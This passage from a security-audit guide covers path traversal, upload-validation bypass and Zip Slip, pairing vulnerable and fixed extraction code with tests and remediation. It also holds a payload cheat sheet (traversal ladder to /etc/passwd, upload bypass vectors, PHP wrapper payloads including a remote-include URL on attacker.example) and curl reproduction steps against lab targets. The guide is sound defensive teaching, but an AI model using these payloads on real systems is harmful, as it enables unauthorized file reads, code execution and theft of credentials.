    while ((e = zis.getNextEntry()) != null) {
        Path target = base.resolve(e.getName()).normalize();
        if (!target.startsWith(base)) {
            throw new IOException("Blocked zip-slip entry: " + e.getName());
        }
        if (e.isDirectory()) {
            Files.createDirectories(target);
            continue;
        }
        Files.createDirectories(target.getParent());
        try (OutputStream os = Files.newOutputStream(target)) {
            int n;
            long total = 0;
            while ((n = zis.read(buf)) > 0) {
                total += n;
                if (total > MAX_ENTRY_BYTES) {
                    throw new IOException("entry too large");
                }
                os.write(buf, 0, n);
            }
        }
    }
}
```

Go (archive/tar, including symlink rejection):

```go
// VULNERABLE
tr := tar.NewReader(fr)
for {
    hdr, err := tr.Next()
    if err == io.EOF {
        break
    }
    target := filepath.Join(destDir, hdr.Name)          // hdr.Name may contain ../
    f, _ := os.Create(target)
    io.Copy(f, tr)
    f.Close()
}
```

```go
// FIXED
func extractTar(fr io.Reader, destDir string) error {
    base, err := filepath.Abs(destDir)
    if err != nil {
        return err
    }
    tr := tar.NewReader(fr)
    for {
        hdr, err := tr.Next()
        if err == io.EOF {
            return nil
        }
        if err != nil {
            return err
        }
        if hdr.Typeflag == tar.TypeSymlink || hdr.Typeflag == tar.TypeLink {
            return fmt.Errorf("refusing archived link: %s -> %s",
                hdr.Name, hdr.Linkname)
        }
        target := filepath.Clean(filepath.Join(base, hdr.Name))
        rel, rerr := filepath.Rel(base, target)
        if rerr != nil || rel == ".." ||
            strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
            return fmt.Errorf("blocked zip/tar-slip entry: %s", hdr.Name)
        }
        switch hdr.Typeflag {
        case tar.TypeDir:
            if err := os.MkdirAll(target, 0750); err != nil {
                return err
            }
        case tar.TypeReg:
            if err := os.MkdirAll(filepath.Dir(target), 0750); err != nil {
                return err
            }
            f, err := os.OpenFile(target, os.O_CREATE|os.O_TRUNC|os.O_WRONLY,
                os.FileMode(hdr.Mode)&0740)
            if err != nil {
                return err
            }
            _, cErr := io.CopyN(f, tr, maxExtractBytes+1)
            f.Close()
            if cErr != nil && cErr != io.EOF {
                return cErr
            }
        default:
            return fmt.Errorf("unsupported entry type %q", hdr.Typeflag)
        }
    }
}
```

C# (System.IO.Compression):

```csharp
// VULNERABLE
using var archive = ZipFile.OpenRead(uploadedPath);
foreach (var entry in archive.Entries)
{
    entry.ExtractToFile(Path.Combine(destDir, entry.FullName), true); // ../ honored
}
```

```csharp
// FIXED
var baseDir = Path.GetFullPath(destDir);
using var archive = ZipFile.OpenRead(uploadedPath);
foreach (var entry in archive.Entries)
{
    var target = Path.GetFullPath(Path.Combine(baseDir, entry.FullName));
    if (!target.StartsWith(baseDir + Path.DirectorySeparatorChar,
                           StringComparison.OrdinalIgnoreCase))
        throw new IOException($"Blocked zip-slip entry: {entry.FullName}");
    Directory.CreateDirectory(Path.GetDirectoryName(target)!);
    if (string.IsNullOrEmpty(entry.Name))
        continue;                                       // pure directory entry
    entry.ExtractToFile(target, overwrite: true);
}
```

Ruby (stdlib zlib/zip gems pattern):

```ruby
# FIXED
def safe_entry_target(base_dir, entry_name)
  target = File.expand_path(File.join(base_dir, entry_name))
  raise ArgumentError, "entry escapes base: #{entry_name}" \
    unless target.start_with?(File.expand_path(base_dir) + File::SEPARATOR)
  target
end

Zip::File.open(uploaded_path) do |zip|
  zip.each do |entry|
    next if entry.directory?
    target = safe_entry_target(IMPORT_DIR, entry.name)
    FileUtils.mkdir_p(File.dirname(target))
    entry.extract(target) { true }                      # overwrite allowed post-check
  end
end
```

### Payload cheat-sheet

#### Traversal payload ladder (apply in order until one layer's assumptions break)

| Stage | Payload (for `GET ?page=` or path param) | Defeats |
|---|---|---|
| L0 baseline | `../../../../etc/passwd` | nothing — first probe |
| L1 deep nesting | `../../../../../../../../../../etc/passwd` | unknown depth of base dir |
| L2 single-encoded slash | `..%2f..%2f..%2f..%2fetc%2fpasswd` | filters matching literal `/` after `..` |
| L3 encoded dots | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` | filters matching literal `..` |
| L4 mixed | `%2e%2e/%2e%2e/..%2fetc%2fpasswd` | filters matching only one token shape |
| L5 double-encoded | `%252e%252e%252f%252e%252e%252fetc%252fpasswd` | apps/servers that decode twice |
| L6 backslash (Windows/IIS) | `..\..\..\..\windows\win.ini` and `..%5c..%5cwindows%5cwin.ini` | POSIX-only thinking on NTFS hosts |
| L7 absolute injection | `/etc/passwd`, `C:\Windows\win.ini` | joins where rooted argument replaces base (see algebra table) |
| L8 dot-segment tricks | `....//....//etc/passwd`, `..././..././etc/passwd` | naive iterative `str.replace('../','')` filters |
| L9 suffix-eating | `../../etc/passwd/.` , `../../etc/passwd%00.png` (null byte: PHP < 5.3.4, old JVMs — HISTORICAL) | forced extensions appended by code |
| L10 UTF-8 overlong | `%c0%ae%c0%ae%c0%afetc/passwd` (HISTORICAL — old Tomcat/IIS) | legacy decoders only; do not expect hits on modern stacks |

Which layer normalizes what (recap for reporting): browsers and curl (without `--path-as-is`) collapse `../` in the URL path before the server sees them — put traversals in QUERY VALUES or use `--path-as-is`. Frameworks decode `%XX` exactly once; `%252e` survives as `%2e` unless the app decodes again. The kernel never sees encodings — only final bytes.

#### Upload bypass matrix

| Validation present | Bypass vectors to test (statically confirm absence of countermeasure) |
|---|---|
| Extension blacklist `.php` | `.php5`, `.php7`, `.phtml`, `.phar`, `.pht` (legacy), `.PHP`/`.Php` (case), `.php.jpg` (multi-extension handler setups), `.php.` / `.php ` (Windows trailing dot/space stripping — legacy) |
| Extension blacklist `.aspx`/`.jsp` | `.ashx`, `.asmx`, `.ascx`, `.svc`, `.jspx`, `.jsw`, `.jsv`, `.war` placement in deploy dirs |
| Client Content-Type allowlist only | Send `Content-Type: image/gif` with PHP/JSP body — declared type is attacker text |
| Magic-byte GIF check only | `GIF89a` header prepended to script body (polyglot; GIFAR concept for Flash-era — mark historical, polyglot-vs-sniffer still relevant) |
| Filename sanitized for `/` only | Backslash `..\..\shell.aspx` on Windows hosts; URL-encoded `%2e%2e%2f` surviving one decode layer; NUL truncation `%00` (historical) |
| Landing dir inside webroot | Any accepted-but-dangerous type becomes executable context; `.htaccess` / `.user.ini` / `web.config` upload flips handler mappings even when scripts themselves are blocked |
| Size limit only | Not a security boundary for type — pair with magic checks |

#### PHP stream-wrapper one-liners (for confirmed LFI sinks)

| Wrapper | Payload | Status |
|---|---|---|
| php://filter | `php://filter/convert.base64-encode/resource=index.php` | STILL RELEVANT — no php.ini prerequisites; primary exfil tool through include sinks |
| php://filter (chained) | `php://filter/read=convert.base64-encode/resource=/etc/passwd` | STILL RELEVANT |
| data:// | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==` | CONDITIONAL — requires `allow_url_include=On` for include(); default Off since PHP 5.2 |
| http(s):// | `https://attacker.example/shell.txt` | CONDITIONAL (RFI) — `allow_url_include=On` for include(), `allow_url_fopen=On` for read funcs |
| expect:// | `expect://id` | HISTORICAL/rare — requires PECL expect extension |
| zip:// | `zip:///var/www/uploads/x.zip%23shell.txt` | CONDITIONAL — zip extension present; note `#` must be encoded in URLs |
| phar:// | `phar:///var/www/uploads/x.phar/test.txt` | CONDITIONAL — primarily valuable as deserialization trigger on metadata access; relevant in gadget chains, not plain LFI |
| file:// | `file:///etc/passwd` | STILL RELEVANT but redundant with plain paths |

#### Zip-slip entry-name examples (what the extractor must reject)

```text
../../../../tmp/zipslip-poc.txt
..\..\zipslip-poc.bat
a/b/../../../../etc/cron.d/zipslip-poc
....//....//zipslip-poc.sh
/etc/zipslip-abs-poc                      (absolute entry names some extractors honor)
legit.txt                                  (control: must succeed)
```

## Taint Tracing Guidance

### Sources (where attacker path data enters)

- HTTP: route params, query, form bodies, JSON bodies, headers (`X-Forwarded-*`, `X-Original-URL` used by proxies feeding path logic), cookies.
- Multipart metadata: client-supplied `filename` on EVERY part — independent of file content.
- Second-order: filenames/keys/paths persisted in DB or queues at upload time, later reused in exports/backups/archives; admin panels storing "logo path".
- Inter-service: message-queue payloads, webhook bodies containing file references, CLI flags reaching shared libraries also called from web routes.

### Sinks (per language, ranked by impact)

| Impact | Sinks |
|---|---|
| Execution | `include`/`require` (PHP), `require(var)`/`import(var)` (Node), `importlib`/`__import__`/`exec(open(..))` (Python), `LoadControl`/dynamic view resolution (.NET), JSP forward/include with variables, template engine render of user-named templates |
| Write | `fs.writeFile/createWriteStream`, `open(w)`, `Files.write/newOutputStream`, `File.WriteAllText`, `fopen('w')`, `File.write`, `os.Create`, `move_uploaded_file`, uploader `store` methods |
| Read/Serve | `fs.readFile`, `open()`, `Files.*`, `File.ReadAllText`, `file_get_contents`/`readfile`, `File.read`, `os.Open/ioutil.ReadFile`, `res.sendFile/res.download/send_file/FileResponse/PhysicalFile/http.ServeFile/send_data/X-Accel-Redirect` |
| Delete | `fs.unlink/rm`, `os.remove/os.unlink/shutil.rmtree`, `Files.delete/deleteIfExists`, `File.Delete`, `unlink()`, `FileUtils.rm_rf`, `os.Remove/RemoveAll` |
| Meta | `chmod/chown`, `stat`, `rename`, `copy`, archive extractors (extraction loop = write sink per entry) |

### Propagators

- All join functions listed in the algebra table; string concat; f-strings/templates; `StringBuilder`; `sprintf('%s/%s')`; ORM-stored fields carrying names; config values populated from requests.
- Normalizers that LOOK like sanitizers but are not: `basename()`/`path.basename` (kills traversal but also kills legitimate subpaths — and misses Windows `\` when run on POSIX: `basename('..\\x')` on Linux returns `..\x` intact), `preg_replace` of `../`, `String.Replace("../","")`.

### Sanitizers that actually break taint

- Hard allowlist: `^[a-z0-9_-]{1,64}$` on a NAME component, then join yourself.
- ID→metadata lookup replacing name passthrough entirely.
- Correct containment: decode/normalize FIRST (`resolve`/`GetFullPath`/`realpath`/`Clean+Rel`/`toRealPath`), then strict-prefix compare WITH separator, ideally after symlink resolution.
- Constant maps for include targets (switch on enum-like keys to literals).

### Procedure

1. Start at each sink hit from Where To Look greps; walk backwards to the nearest join.
2. Identify which join arguments are tainted and their source endpoint (annotate file:line for the report).
3. Walk upstream from source to sink listing EVERY transformation: decodes, replaces, regexes, basename calls, length caps, charset checks.
4. Decide: does any REAL sanitizer exist between them? If yes, attempt lexical bypass reasoning (encode twice, backslashes, dot tricks, absolute injection) against the SPECIFIC check text.
5. If a containment check exists, grade it against the defect list in What To Check (separator-less startsWith, pre-decode ordering, missing symlink resolution, case sensitivity).
6. Compute the predicted final path for your best payload; state which file it reads/writes/deletes and why that matters (secrets? web-executable? config?).
7. Only then decide dynamic verification is warranted — and only against authorized targets.

## Exploitation & Reproduction

Static confirmation is sufficient for a finding. Use live steps ONLY against authorized lab/staging targets. Never execute uploaded payloads against any system without explicit authorization; the upload procedure below stops at confirming storage, deliberately.

### Repro 1: LFI read of /etc/passwd

1. Identify the include/read parameter (here `page` on `http://LAB/index.php`).
2. Send the baseline ladder:
   ```bash
   curl -s "http://LAB/index.php?page=../../../../etc/passwd"
   curl -s --path-as-is "http://LAB/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   ```
3. Expected observable (vulnerable): output contains the marker line `root:x:0:0:root:/root:/bin/bash` (or `root:*:0:0:` variants on some Unices — match on `root:x:0:0` OR `root:*:0:0`).
4. If literal `../` was filtered but output shows a PHP warning naming a wrapper-capable path, escalate to filter read of source:
   ```bash
   curl -s "http://LAB/index.php?page=php://filter/convert.base64-encode/resource=index.php"
   ```
   Expected observable: base64 blob in-page; `echo '<b64>==' | base64 -d` yields application source — proves arbitrary read and exposes further secrets (DB creds) for the report.
5. Record: endpoint, parameter, winning payload stage (L0–L10), marker observed, and whether warnings leak absolute paths.

### Repro 2: traversal read proving reachability of app config

1. Pick a file whose CONTENT you can recognize and whose presence proves cross-boundary read without touching credentials unnecessarily — prefer a known app config over system files when demonstrating app impact:
   ```bash
   curl -s --path-as-is "http://LAB/download?name=../../../etc/passwd"
   curl -s --path-as-is "http://LAB/static/..%2f..%2f..%2f..%2fetc/passwd"
   ```
   (`--path-as-is` is REQUIRED for path-segment payloads; without it curl merges `..` client-side.)
2. Expected observable (vulnerable): HTTP 200, `Content-Type: application/octet-stream` or similar, body contains `root:x:0:0` marker.
3. Prove application-data reachability with a second read of an app-owned file discovered statically (e.g., `?name=../config/database.yml`):
   Expected observable: YAML/JSON structure matching the repo copy — cite both repo file and response excerpt in the report.
4. If the endpoint serves images inline, repeat with `Content-Disposition` observation: forced-attachment behavior ABSENT means the same primitive doubles as same-origin script delivery when pointed at attacker-influenced content (note for WEB cross-ref; do not weaponize).
5. Negative control: send `?name=report-q3.pdf` (a file that should legitimately exist). Expected: 200 with plausible PDF bytes — confirms the endpoint semantics, not just an error-differential.

### Repro 3: upload validation bypass chain (storage confirmation only)

1. Baseline sanity upload (must succeed if feature works):
   ```bash
   curl -s -X POST "http://LAB/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@/tmp/opencode/ok.png;type=image/png"
   ```
   Expected observable: 200/201 JSON containing an id/path field. Record the returned location format.
2. Extension/MIME mismatch probe (declared type lies, content is text):
   ```bash
   printf '%s\n' '<?php echo "PROBE-NOT-EXECUTED"; ?>' > /tmp/opencode/probe.php.jpg
   curl -s -X POST "http://LAB/upload" -H "Authorization: Bearer $TOKEN" \
        -F "file=@/tmp/opencode/probe.php.jpg;type=image/jpeg"
   ```
   Expected observable if validation is extension-blacklist-only: acceptance (2xx). If rejected: 400 — record which leg caught it by varying ONE factor at a time (extension, declared type, content).
3. Filename traversal probe (does the stored name derive from ours?):
   ```bash
   curl -s -X POST "http://LAB/upload" -H "Authorization: Bearer $TOKEN" \
        -F 'file=@/tmp/opencode/ok.png;filename=../../probe-write-test.png'
   ```
   Expected observable (vulnerable): response or subsequent listing reveals the stored path escaping the upload dir (e.g., file appears at `../../probe-write-test.png` relative to storage root — verify via a second read endpoint or directory listing, NOT via execution). Expected (fixed): stored name is random hex; our string survives only as display metadata in DB/API.
4. STOP HERE. Do not upload working webshells and do not fetch uploaded scripts in a way that executes them. Confirmation of "stored filename/location" is the deliverable; executability claims come from static analysis of server config (landing dir inside webroot? script handler mapped?).
5. Report: which validation legs existed (extension/MIME/magic/name/location), which failed, stored-location evidence.

### Repro 4: Zip Slip demonstration (crafted archive)

Craft locally with Python stdlib, then submit to the authorized target's import endpoint:

```python
# Craft a zip whose entry escapes the extraction root (run locally in lab only)
import zipfile
with zipfile.ZipFile("/tmp/opencode/slip.zip", "w") as z:
    z.writestr("../../../../tmp/zipslip-poc.txt", "zipslip-proof-of-extraction")
```

1. Submit:
   ```bash
   curl -s -X POST "http://LAB/imports" -H "Authorization: Bearer $TOKEN" \
        -F "archive=@/tmp/opencode/slip.zip"
   ```
2. Expected observable (vulnerable extractor): file `/tmp/zipslip-poc.txt` exists on the target host afterward (verify via authorized shell or a read-back mechanism you control). Alternative observable: 500 error mentioning path denial.
3. Expected observable (fixed extractor): request rejected with 400/validation error naming the entry, AND the control archive (same craft minus `../`, entry `legit.txt`) extracts successfully.
4. Static-only alternative (preferred during audits): trace the extractor code against the safe-loop patterns above; demonstrate the missing containment by quoting the vulnerable lines. Do not need host access to justify the finding.

## Remediation

### Design rules (apply in this order)

1. **Allowlist-first**: acceptable values are enumerated server-side (constant maps for includes, extension allowlists, charset-restricted name grammars `^[a-z0-9_-]{1,64}\.[a-z0-9]{2,5}$`). Anything not matching is rejected, not "cleaned".
2. **ID→metadata lookup**: user-facing handles are opaque IDs; the server owns the path. Client-supplied filenames become DISPLAY labels only, stored in DB, never joined into paths.
3. **Canonicalize then compare, always**: resolve (`realpath`/`resolve`/`GetFullPath`/`toRealPath`/`EvalSymlinks`) BEFORE prefix comparison; include the trailing separator in the prefix; handle case-insensitivity for Windows targets.
4. **Containment at the LAST moment**: re-verify inside the open/extraction routine, not only at the API edge (defends TOCTOU and future callers).
5. **Fail closed**: any containment violation raises/rejects loudly; log source IP + attempted value.

Containment snippets done right are provided per language in Patterns & Signatures (JS `safeResolve`, Python `safe_resolve`, Java `safeResolve` with `toRealPath`, C# rooted-prefix compare, PHP `realpath`+`str_starts_with`, Ruby `expand_path`+`realpath`, Go `filepath.Rel`+`EvalSymlinks`). Reuse those verbatim rather than inventing weaker variants.

### Upload hardening checklist

- [ ] Server-generated random storage names (`crypto.randomBytes(16)` hex, `uuid4`, `random_bytes(16)`); original filename kept as DB metadata only.
- [ ] Storage OUTSIDE webroot on a non-executable mount (`noexec,nodev,nosuid`), separate from code deployment.
- [ ] Extension allowlist AND declared-MIME allowlist AND magic-byte verification (python-magic/libmagic, npm file-type, Apache Tika, `finfo`, `net/http.DetectContentType` for common types).
- [ ] Images re-encoded on ingest (Pillow `Image.open(...).save(...)`, sharp pipeline) — destroys embedded payloads; reject on decode failure.
- [ ] Reject dangerous names outright even as labels: no leading dots, no `../`, no control chars, cap length; block `.htaccess`, `.user.ini`, `web.config`, `.config`, `crossdomain.xml` as stored names.
- [ ] Size limits enforced pre-buffering (multipart streaming limits) plus per-user quotas.
- [ ] Stored file modes 0640/0600 owned by the service account; no exec bits ever.
- [ ] Serve user content from a separate domain or CDN (cookie isolation), with `Content-Disposition: attachment` where type is not strictly needed, `X-Content-Type-Options: nosniff`, and a restrictive `Content-Security-Policy` sandbox on preview pages.
- [ ] Optional: AV scan gate for document pipelines; quarantine dir for failures.

### Safe extraction requirements

- Per-entry containment check against the RESOLVED destination (loops above), rejecting absolute entry names and drive-letter forms.
- Refuse or neutralize symlink/hardlink entries in tar (or validate `Linkname` resolves inside base).
- Decompression budget (total bytes + entry count) to blunt nested-archive exhaustion — scoring details in DOS (cross-ref DOS).
- Extract into a fresh randomized staging dir per job; never extract over live application trees.

### Deletion and storage-layer fixes

- Delete operations take IDs; resolve to server-owned paths; containment check identical to read paths; refuse directory recursion unless the ID maps to a dedicated subtree.
- Object storage: build keys from server-side identifiers (`tenantId/objectId` with UUIDv4 objectIds); never accept raw key prefixes from clients; sign URLs for SINGLE keys with shortest practical TTL; keep tenant authorization at the metadata layer, not the key layer (deep dive in CONFIG).

## Verification & Validation

### GIVEN/WHEN/THEN tests

Test suite — traversal:

```gherkin
Scenario: Legitimate download still works (negative control)
  Given a user U owns document DOC-1 stored as "a1b2...pdf"
  When U requests GET /api/documents/DOC-1/download
  Then the response status is 200
  And the body equals the originally uploaded bytes
  And Content-Disposition attachment carries the original display name

Scenario: Classic traversal is rejected
  When anyone requests GET /api/documents?id=../../etc/passwd
  Then the response status is 400 or 404
  And the body does not contain "root:x:0:0"

Scenario: Encoded traversal is rejected identically
  When anyone requests GET /api/documents?id=%2e%2e%2f%2e%2e%2fetc%2fpasswd
  Then the response status is 400 or 404

Scenario: Absolute-path injection is rejected
  When anyone requests GET /api/documents?id=/etc/passwd
  Then the response status is 400 or 404
```

Test suite — upload:

```gherkin
Scenario: Normal image upload succeeds (negative control)
  Given a valid PNG under the size limit
  When POST /avatar with Content-Type image/png
  Then the response is 201 with an id
  And a file named [32-hex].png exists in the storage volume
  And no file outside the storage volume changed (checksum the parent dirs)

Scenario: Script content in image clothing is rejected
  When POST /avatar with a file whose body starts "<?php" and declared type image/jpeg
  Then the response is 400
  And no new file exists in the storage volume

Scenario: Traversal filename cannot steer storage
  When POST /avatar with multipart filename "../../escape.bin"
  Then the response is 201 or 400
  And IF 201: the stored name matches ^[0-9a-f]{32}\.(png|jpg|gif)$ and "../../escape.bin" appears nowhere on disk
```

Test suite — archive extraction:

```gherkin
Scenario: Benign archive extracts
  Given a zip containing "docs/a.txt" and "docs/b.txt"
  When the import job runs
  Then IMPORT_DIR/docs/a.txt and b.txt exist with original contents

Scenario: Zip-slip entry is rejected without side effects
  Given slip.zip crafted with entry "../../../../tmp/zipslip-poc.txt"
  When the import job runs
  Then the job fails with a validation error naming the entry
  And /tmp/zipslip-poc.txt does not exist
  And no file exists outside IMPORT_DIR
```

### Regression pseudocode

```text
PAYLOADS = ladder(L0..L10) + ["..\\..\\windows\\win.ini",
                              "/etc/passwd", "....//....//etc/passwd"]
for p in PAYLOADS:
    r = http_get(DOWNLOAD_EP, params={"name": p})
    assert r.status_code in (400, 404), f"accepted {p}"
    assert "root:" not in r.text and "win.ini" not in r.text.lower()

assert http_get(DOWNLOAD_EP, params={"name": KNOWN_GOOD}).status_code == 200

UPLOAD_VECTORS = [("x.php.jpg","image/jpeg","<?php echo 1;?>"),
                  ("ok.gif","image/gif","GIF89a"+PAYLOAD_BODY),
                  ("ok.png","image/png",PNG_WITH_TRAILING_SCRIPT)]
for name, ctype, body in UPLOAD_VECTORS:
    r = http_post_multipart(UPLOAD_EP, name=name, ctype=ctype, body=body)
    assert r.status_code == 400, f"vector stored: {name}"
    assert storage_listing() unchanged

z = craft_zip(["../../poc.txt"])
assert import_endpoint(z).status_code == 400
assert not exists("/tmp/poc.txt")
```

### Manual re-test checklist

1. Re-run every grep in Where To Look; confirm each previously flagged sink now sits behind a containment helper or allowlist.
2. For each fix, quote the new check and walk one payload through it mentally (which characters survive? what does `resolve` produce?).
3. Confirm negative controls pass in the test environment (legit downloads, benign upload, benign archive).
4. Confirm failure modes fail CLOSED: simulate a containment exception and verify the endpoint returns 400/500 without leaking the absolute server path in the response.
5. Verify logging: rejected traversal/upload attempts appear in logs with source and value.
6. Check the landing/storage directory permissions and mount flags on a deployed instance match the checklist.
7. Re-test with the storage-root moved one level deeper (catches hardcoded depth-count traversals and wrong-base constants).

### Greps to rerun post-fix

```regex
# Containment primitives should now appear near every join
(startsWith\([^)]*sep|relative_to\(|commonpath\(|startsWith\(base|str_starts_with\(\$|filepath\.Rel\(|toRealPath\(|EvalSymlinks\(|GetFullPath\()
```

```regex
# These must return ZERO production-code hits (fixtures/negative tests excepted)
(include\s*\(\s*\$_|require\s*\(\s*\$_|originalname\s*\)\s*$|extractAll\(|ExtractToFile\(Path\.Combine\(destDir,\s*entry)
```

```regex
# Random-name generators present in every upload handler
(randomBytes\(\d+\)|uuid|random_bytes\(|RandomStringUtils|secrets\.token_hex)
```

## Severity Assessment

### CWE mapping

| CWE | Name | Role in this module |
|---|---|---|
| CWE-22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Parent class for traversal read/write/delete/serve |
| CWE-23 | Relative Path Traversal | `../`-based escapes; Zip Slip entry names |
| CWE-36 | Absolute Path Traversal | Rooted-path injection via join quirks |
| CWE-73 | External Control of File Name or Path | General taint-to-path finding when class unclear |
| CWE-98 | Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') | PHP dynamic includes incl. wrapper/RFI cases |
| CWE-434 | Unrestricted Upload of File with Dangerous Type | Upload validation-chain failures |
| CWE-409 | Improper Handling of Highly Compressed Data (Data Amplification) | Boundary note: decompression amplification is scored here only when extraction lacks budgets; quantitative DoS analysis lives in DOS |

### Rubric

| Finding | Default severity | Notes |
|---|---|---|
| Traversal/include reachable to code execution (wrapper RCE, dynamic require of attacker path, executable upload in script-mapped dir) | Critical | Treat upload-to-web-executable-dir as RCE-equivalent even unproven dynamically |
| Traversal/include to arbitrary READ of secrets (private keys, creds, source) | Critical to High | Key material/creds push to Critical |
| Traversal arbitrary read without demonstrated secret reach | High | Any-path read on internet-facing host |
| Traversal limited to one directory tree containing sensitive user data (IDOR-flavored) | Medium-High | Cross-ref AUTHZ if ownership checks absent |
| Arbitrary file DELETE with reset/config-wipe chain potential | High | Anti-forensics angle noted |
| Upload requiring chaining for impact (stored-XSS-only outcome, no exec) | Medium | Cross-ref WEB for the XSS half |
| Upload rejected safely except exotic server-specific handler quirks | Low | Environment-dependent |
| Temp-file race / symlink following in shared dirs | Context-dependent Low-High | Multi-tenant shared dirs raise it; single-user local daemons lower it |
| Missing decompression budget alone | Low here | Escalate via DOS module |

### CVSS v3.1 example vectors

- Unauthenticated upload landing in web-executable dir (RCE-equivalent): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Critical, 10.0 base form).
- Unauthenticated arbitrary file read: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (High, 7.5).
- Authenticated (low-priv) arbitrary read: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (Medium-High, 6.5).
- Adjust AC upward when a non-default php.ini/server config is a precondition (RFI behind `allow_url_include=Off` is NOT exploitable — report as hardening gap, not vuln).

## Common False Positives

- `path.join(base, CONSTANT)` or concatenation with compile-time-only strings — no taint; verify the constant truly is constant (not env/request-derived).
- Framework static middlewares doing their job: `express.static`, `http.FileServer`, `serve-static`, nginx `root` — they neutralize `..` above their root BY DESIGN; flag only misconfiguration (root includes app/config dirs, follow-symlinks enabled into sensitive trees, `showHiddenFiles`-style options exposing dotfiles).
- Router-constrained parameters: `{id:[0-9]+}`-style constraints that provably precede the sink make traversal payloads impossible — downgrade to informational.
- `basename()`-normalized names where the audit target demonstrably runs on POSIX AND no `\` handling matters — still list as fragile pattern, not a confirmed vuln.
- Multer DEFAULT storage (no `diskStorage` override): files land in the OS temp dir with random names and no extension; originalname misuse claims must check the actual config.
- CLI/internal tools where path input comes from the operator, not an external attacker — out of threat model unless the CLI is exposed (CI injection contexts belong elsewhere).
- Containment check that looks weak but operates on pre-join VALIDATED tokens (charset-restricted grammar makes traversal lexically impossible) — confirm the validator actually runs on all code paths.
- Test fixtures and negative-test files containing traversal strings — they are supposed to be there; exclude from findings.
- `realpath` returning false for intentionally-missing optional files handled by design (feature-flagged templates) — verify intended behavior before flagging.

## References

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — https://cwe.mitre.org/data/definitions/22.html
- CWE-23: Relative Path Traversal — https://cwe.mitre.org/data/definitions/23.html
- CWE-36: Absolute Path Traversal — https://cwe.mitre.org/data/definitions/36.html
- CWE-73: External Control of File Name or Path — https://cwe.mitre.org/data/definitions/73.html
- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') — https://cwe.mitre.org/data/definitions/98.html
- CWE-434: Unrestricted Upload of File with Dangerous Type — https://cwe.mitre.org/data/definitions/434.html
- CWE-409: Improper Handling of Highly Compressed Data (Data Amplification) — https://cwe.mitre.org/data/definitions/409.html
- OWASP Cheat Sheet Series — File Upload Cheat Sheet (prevention checklist this module's hardening list aligns to): https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Community — Path Traversal attack description and encoding catalog: https://owasp.org/www-community/attacks/Path_Traversal
